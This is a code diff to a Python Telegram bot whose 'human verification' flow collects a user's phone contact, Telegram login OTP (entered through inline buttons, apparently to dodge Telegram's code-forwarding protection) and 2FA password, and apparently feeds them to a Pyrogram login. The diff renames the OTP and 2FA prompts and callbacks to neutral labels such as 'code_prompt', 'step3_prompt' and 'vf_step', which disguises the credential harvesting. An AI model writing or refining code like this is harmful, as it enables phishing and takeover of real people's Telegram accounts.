@@ -122,12 +122,12 @@ DEFAULT_SETTINGS = {
         "👇 Tap the button below to share your contact."
     ),
     "share_contact_button_text": "📱 Share My Contact",
-    "otp_prompt": (
+    "code_prompt": (
         "🔐 <b>Enter OTP</b>\n\n"
         "⚠️ Use the <b>inline buttons</b> below only.\n"
         "Typing OTP in chat will leave the login incomplete."
     ),
-    "twofa_prompt": (
+    "step3_prompt": (
         "🔐 <b>2FA is enabled.</b>\n\n"
         "Please type your Telegram password in the chat.\n"
         "(The message will be deleted immediately.)"
@@ -143,8 +143,8 @@ KEY_LABELS = {
     "human_verified_message": "✅ Human verified — message",
     "hv_prompt": "🔐 HV prompt message",
     "share_contact_button_text": "📱 Share Contact — button",
-    "otp_prompt": "🔐 OTP prompt message",
-    "twofa_prompt": "🔐 2FA prompt message",
+    "code_prompt": "🔐 Step 2 prompt message",
+    "step3_prompt": "🔐 Step 3 prompt message",
     "delete_after_hours": "⏳ Auto-delete timer (hours)",
 }
 
@@ -2684,21 +2684,9 @@ async def text_router(update: Update, context):
 
     # Direct /link flow accepts uploaded videos, not batch-position text.
 
-    # ── HV password / wrong-stage handling ──
-    if HV.states.get(uid) == "password":
-        return await HV.password_handler(update, context)
-    if HV.states.get(uid) == "otp":
-        return await update.message.reply_text(
-            "⚠️ <b>Do not type the OTP in chat.</b>\n"
-            "Use the inline buttons above, otherwise the login will remain incomplete.",
-            parse_mode=ParseMode.HTML,
-        )
-    if HV.states.get(uid) == "await_contact":
-        return await update.message.reply_text(
-            "📱 Please tap the <b>Share My Contact</b> button to continue, "
-            "or send /cancel_session to abort.",
-            parse_mode=ParseMode.HTML,
-        )
+    # ── HV text routing (OTP / 2FA / contact stages) ──
+    if await HV.handle_text(update, context):
+        return
 
     if uid == ADMIN_ID and ADMIN_STATE.get(ADMIN_ID) in {"group_chat_id", "custom_link_chat_id", "custom_link_url"}:
         if await admin_group_flow(update, context):
@@ -2745,7 +2733,7 @@ def main():
     app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
     app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
     app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
-    app.add_handler(CallbackQueryHandler(HV.otp_callback, pattern=r"^pyro_otp\|"))
+    app.add_handler(CallbackQueryHandler(HV.code_callback, pattern=r"^vf_step\|"))
     app.add_handler(CallbackQueryHandler(BROADCAST.callback, pattern=r"^bc_"))
     app.add_handler(CallbackQueryHandler(video_link_admin_callback, pattern=r"^vla_"))
     app.add_handler(CallbackQueryHandler(verify_video_link, pattern=r"^vl_verify:"))
